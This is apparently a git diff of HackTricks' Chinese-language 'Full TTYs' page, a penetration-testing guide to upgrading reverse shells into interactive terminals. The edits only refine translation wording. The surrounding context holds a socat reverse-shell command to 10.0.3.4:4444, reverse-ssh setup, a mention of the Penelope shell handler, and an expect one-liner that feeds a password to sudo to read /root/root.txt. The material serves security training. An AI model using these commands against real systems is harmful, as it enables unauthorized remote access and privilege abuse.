@@ -1,8 +1,8 @@
 # Full TTYs
 
 {% hint style="success" %}
-学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -10,14 +10,14 @@
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
 * **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
 
 ## Full TTY
 
-请注意，您在 `SHELL` 变量中设置的 shell **必须**在 _**/etc/shells**_ 中 **列出**，否则会出现 `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`。此外，请注意，以下代码片段仅在 bash 中有效。如果您在 zsh 中，请在通过运行 `bash` 获取 shell 之前切换到 bash。
+请注意，您在 `SHELL` 变量中设置的 shell **必须**在 _**/etc/shells**_ 中 **列出**，否则会出现 `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`。此外，请注意，以下代码片段仅在 bash 中有效。如果您在 zsh 中，请在获取 shell 之前通过运行 `bash` 切换到 bash。
 
 #### Python
 
@@ -71,7 +71,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 以下是针对`x86`的示例，使用了upx压缩的二进制文件。有关其他二进制文件，请查看[发布页面](https://github.com/Fahrj/reverse-ssh/releases/latest/)。
 
-1. 在本地准备以捕获ssh端口转发请求：
+1. 本地准备以捕获ssh端口转发请求：
 
 {% code overflow="wrap" %}
 ```bash
@@ -114,13 +114,13 @@ sftp -P 8888 127.0.0.1
 ```
 ## Penelope
 
-Penelope (https://github.com/brightio/penelope) 自动将 Linux 反向 shell 升级为 TTY，处理终端大小，记录所有内容等等。它还为 Windows shell 提供 readline 支持。
+[Penelope](https://github.com/brightio/penelope) 自动将 Linux 反向 shell 升级为 TTY，处理终端大小，记录所有内容等等。它还为 Windows shell 提供 readline 支持。
 
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
 ## No TTY
 
-如果由于某种原因您无法获得完整的 TTY，您 **仍然可以与期望用户输入的程序交互**。在以下示例中，密码被传递给 `sudo` 以读取文件：
+如果由于某种原因您无法获得完整的 TTY，您**仍然可以与期望用户输入的程序交互**。在以下示例中，密码被传递给 `sudo` 以读取文件：
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
